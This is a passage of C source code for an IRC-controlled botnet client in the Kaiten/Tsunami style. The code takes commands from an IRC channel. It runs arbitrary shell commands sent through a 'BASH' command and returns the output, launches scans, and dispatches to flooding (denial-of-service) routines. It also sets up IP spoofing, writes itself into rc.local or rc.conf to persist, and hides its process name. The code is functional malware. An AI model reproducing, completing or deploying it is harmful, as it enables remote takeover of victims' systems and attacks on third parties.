                        sprintf(buf,"export HOME=/tmp;export PATH=/var/bin:/bin:/sbin:/usr/bin:/usr/sbin;(([ ! -x /var/bin/scan ] || [ ! -x /var/bin/nmap ]) && echo \"I am missing either scan or nmap, and Shellzrus was on Xanax when he wrote this, so you need to do INSTALL http:\x2f\server/nmap and INSTALL http:\x2f\x2fserver/scan first...\" && ([ -f /var/bin/nmap ] && ls -l /var/bin/nmap) && ([ -f /va\x72/bin/scan ] && ls -l /var/bin/scan) || scan %s)",message+5);
                        command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);
                }

		if (!strncmp(message,"BASH ",5)) {
                        char buf[1024];
                        FILE *command;
                        if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,"export HOME=/tmp;export SHELL=/var/bin/bash;export PATH=/bin:/sbin:/usr/bin:/usr/sbin:/var/bin;%s",message+5);
                        command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);

		}

                m=strlen(message);
                for (i=0;i<m;i++) {
                        if (*message == ' ' || *message == 0) break;
                        name[i]=*message;
                        message++;
                }
                for (i=0;i<strlen(message);i++) if (message[i] == ' ') num_params++;
                num_params++;
                if (num_params > 10) num_params=10;
                params[0]=name;
                params[num_params+1]="\0";
                m=1;
                while (*message != 0) {
                        message++;
                        if (m >= num_params) break;
                        for (i=0;i<strlen(message) && message[i] != ' ';i++);
                        params[m]=(char*)malloc(i+1);
                        strncpy(params[m],message,i);
                        params[m][i]=0;
                        m++;
                        message+=i;
                }
                for (m=0; flooders[m].cmd != (char *)0; m++) {
                        if (!strcasecmp(flooders[m].cmd,name)) {
                                flooders[m].func(sock,sender,num_params-1,params);
                                for (i=1;i<num_params;i++) free(params[i]);
                                return;
                        }
                }
        }
}
void _376(int sock, char *sender, char *str) {
        Send(sock,"MODE %s -xi\n",nick);
        Send(sock,"JOIN %s :%s\n",chan,key);
        Send(sock,"WHO %s\n",nick);
}
void _PING(int sock, char *sender, char *str) {
        Send(sock,"PONG %s\n",str);
}
void _352(int sock, char *sender, char *str) {
        int i,d;
        char *msg=str;
        struct hostent *hostm;
        unsigned long m;
        for (i=0,d=0;d<5;d++) {
                for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                if (i == strlen(str)) return;
        }
        for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
        msg[i]=0;
        if (!strcasecmp(msg,nick) && !spoofsm) {
                msg=str;
                for (i=0,d=0;d<3;d++) {
                        for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                        if (i == strlen(str)) return;
                }
                for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
                msg[i]=0;
                if ((m = inet_addr(msg)) == -1) {
                        if ((hostm=gethostbyname(msg)) == NULL) {
                                Send(sock,"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\n",chan);
                                return;
                        }
                        memcpy((char*)&m, hostm->h_addr, hostm->h_length);
                }
                ((char*)&spoofs)[3]=((char*)&m)[0];
                ((char*)&spoofs)[2]=((char*)&m)[1];
                ((char*)&spoofs)[1]=((char*)&m)[2];
                ((char*)&spoofs)[0]=0;
                spoofsm=256;
        }
}
void _433(int sock, char *sender, char *str) {
        free(nick);
        nick=makestring();
}
void _NICK(int sock, char *sender, char *str) {
	int i;
        for (i=0;i<strlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
	if (!strcasecmp(sender,nick)) {
		if (*str == ':') str++;
		if (nick) free(nick);
		nick=strdup(str);
	}
}
struct Messages { char *cmd; void (* func)(int,char *,char *); } msgs[] = {
        { "352", _352 },
        { "376", _376 },
        { "433", _433 },
        { "422", _376 },
        { "PRIVMSG", _PRIVMSG },
        { "PING", _PING },
	{ "NICK", _NICK },
{ (char *)0, (void (*)(int,char *,char *))0 } };
void con() {
        struct sockaddr_in srv;
        unsigned long ipaddr,start;
        int flag;
        struct hostent *hp;
start:
	sock=-1;
	flag=1;
	if (changeservers == 0) server=servers[rand()%numservers];
	changeservers=0;
        while ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
	if (inet_addr(server) == 0 || inet_addr(server) == -1) {
		if ((hp = gethostbyname(server)) == NULL) {
			server=NULL;
			close(sock);
			goto start;
		}
		bcopy((char*)hp->h_addr, (char*)&srv.sin_addr, hp->h_length);
	}
	else srv.sin_addr.s_addr=inet_addr(server);
        srv.sin_family = AF_INET;
        srv.sin_port = htons(6667);
	ioctl(sock,FIONBIO,&flag);
	start=time(NULL);
	while(time(NULL)-start < 10) {
		errno=0;
		if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0 || errno == EISCONN) {
		        setsockopt(sock,SOL_SOCKET,SO_LINGER,0,0);
		        setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,0,0);
		        setsockopt(sock,SOL_SOCKET,SO_KEEPALIVE,0,0);
			return;
		}
		if (!(errno == EINPROGRESS ||errno == EALREADY)) break;
		sleep(1);
	}
	server=NULL;
	close(sock);
	goto start;
}






int main(int argc, char **argv) {
        int on,i;
        char cwd[256],*str;
        FILE *file;


#ifdef STARTUP
	str="/etc/rc.d/rc.local";
	file=fopen(str,"r");
	if (file == NULL) {
		str="/etc/rc.conf";
		file=fopen(str,"r");
	}
        if (file != NULL) {
                char outfile[256], buf[1024];
                int i=strlen(argv[0]), d=0;
                getcwd(cwd,256);
                if (strcmp(cwd,"/")) {
                        while(argv[0][i] != '/') i--;
                        sprintf(outfile,"\"%s%s\"\n",cwd,argv[0]+i);
                        while(!feof(file)) {
                                fgets(buf,1024,file);
                                if (!strcasecmp(buf,outfile)) d++;
                        }
                        if (d == 0) {
                                FILE *out;
                                fclose(file);
                                out=fopen(str,"a");
                                if (out != NULL) {
                                        fputs(outfile,out);
                                        fclose(out);
                                }
                        }
                        else fclose(file);
                }
                else fclose(file);
        }
#endif
        if (fork()) exit(0);
#ifdef FAKENAME
	strncpy(argv[0],FAKENAME,strlen(argv[0]));
        for (on=1;on<argc;on++) memset(argv[on],0,strlen(argv[on]));
#endif
        srand((time(NULL) ^ getpid()) + getppid());
        nick=makestring();
        ident=makestring();
        user=makestring();
        chan=CHAN;
	key=KEY;
	server=NULL;
sa:
#ifdef IDENT
        for (i=0;i<numpids;i++) {
                if (pids[i] != 0 && pids[i] != getpid()) {
                        kill(pids[i],9);
			waitpid(pids[i],NULL,WNOHANG);
                }
        }
	pids=NULL;
	numpids=0;
	identd();
#endif
	con();
        Send(sock,"NICK %s\nUSER %s localhost localhost :%s\n",nick,ident,user);
        while(1) {
                unsigned long i;
                fd_set n;
                struct timeval tv;
                FD_ZERO(&n);
                FD_SET(sock,&n);
                tv.tv_sec=60*20;
                tv.tv_usec=0;
                if (select(sock+1,&n,(fd_set*)0,(fd_set*)0,&tv) <= 0) goto sa;
                for (i=0;i<numpids;i++) if (waitpid(pids[i],NULL,WNOHANG) > 0) {
                        unsigned int *newpids,on;
                        for (on=i+1;on<numpids;on++) pids[on-1]=pids[on];
			pids[on-1]=0;
                        numpids--;
                        newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
                        for (on=0;on<numpids;on++) newpids[on]=pids[on];
                        free(pids);
                        pids=newpids;
                }
                if (FD_ISSET(sock,&n)) {
                        char buf[4096], *str;
                        int i;
                        if ((i=recv(sock,buf,4096,0)) <= 0) goto sa;
                        buf[i]=0;
                        str=strtok(buf,"\n");
                        while(str && *str) {
                                char name[1024], sender[1024];
                                filter(str);
                                if (*str == ':') {
                                        for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                        str[i]=0;
                                        strcpy(sender,str+1);
                                        strcpy(str,str+i+1);
                                }
                                else strcpy(sender,"*");
                                for (i=0;i<strlen(str) && str[i] != ' ';i++);
                                str[i]=0;
                                strcpy(name,str);
                                strcpy(str,str+i+1);
                                for (i=0;msgs[i].cmd != (char *)0;i++) if (!strcasecmp(msgs[i].cmd,name)) msgs[i].func(sock,sender,str);
                                if (!strcasecmp(name,"ERROR")) goto sa;
                                str=strtok((char*)NULL,"\n");
                        }
                }
        }
        return 0;
}
